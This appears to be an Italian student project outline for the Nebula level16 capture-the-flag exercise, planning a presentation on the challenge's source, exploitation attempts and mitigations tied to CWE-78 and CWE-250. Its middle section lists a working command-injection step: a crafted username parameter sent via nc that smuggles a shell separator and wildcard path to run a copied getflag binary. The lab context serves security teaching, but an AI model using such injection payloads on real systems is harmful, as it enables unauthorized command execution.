# Progetto-Programmazione-Sicura-Nebula-16-
CTF NEBULA 16



Schema della presentazione consiglio vivamente di visionare la presentazione

Intro gruppo- sfida -


analisi cosa fa - cosa abbiamo - cartelle del sistema che vediamo - permessi che possiamo avere

. analisi dei file



3) analisi codice sorgente cioè cosa fa


4) costruzione dell'albero a passi - tentativi numerati - analisi dei tentativi e perchè fallito

	


	PAssi 


	- permessi
	- codice
	- file db
	-------
	- input casuale
	-level16-----

	------
	-;bin/getflag   //a causa della conversione in maiuscolo non si può eseguire.

	grep parametro tr, 
	grep command | tr A-a noooo
	
	- tmp / GETFLAG   cp /bin/getflag /tmp/GETFLAG
	chmod +x GETFLAG
	ls -la

	nc localhost 1616
	get /index.cgi?username="%3B%2F%2A%2FGETFLAG"&

	? eseguire con privilegi
	
	LINK

	https://decepticode.wordpress.com/2016/05/04/nebula-level16/

	https://secinject.wordpress.com/2016/04/15/nebula-level16/




5) ricerca delle cve e mitigazioni possibili
	- caratteri di escape


6) carattere ^ match tutto


6) altre possibili attacchi cve e cwe. 

CWE di riferimento: CWE-250 Execution with Unnecessary Privileges https://cwe.mitre.org/data/definitions/250.html 
CWE di riferimento: CWE-78 Improper Neutralization of Special Elements used in an OS Command (’OS Command Injection') https://cwe.mitre.org/data/definitions/78.html 
